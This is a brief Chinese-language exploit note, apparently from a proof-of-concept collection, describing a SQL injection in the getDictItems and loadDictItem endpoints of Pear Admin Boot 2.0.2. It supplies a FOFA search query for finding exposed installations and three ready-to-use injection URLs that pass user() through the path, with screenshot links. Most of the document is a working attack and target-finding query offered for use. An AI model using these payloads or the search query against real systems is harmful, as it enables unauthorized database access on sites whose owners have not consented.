## Pear-Admin-Boot存在SQL注入漏洞

在Pear Admin Boot 2.0.2版本中发现了一个漏洞，并被列为严重漏洞。此问题影响文件/system/dictData/getDictItems/的getDictItems函数。输入,user(),1,1 的操作会导致SQL注入。

## fofa

```
body="明 湖 区 最 具 影 响 力 的 设 计 规 范 之 一"
```

## poc

```
http://localhost:8088/system/dictData/getDictItems/gen_table,user(),1,1
http://localhost:8088/system/dictData/getDictItems/sys_user,user(),1
http://localhost:8088/system/dictData/loadDictItem/sys_user,user(),1?key=1
```

![输入图片说明](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406281713539.png)

![](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406281713996.png)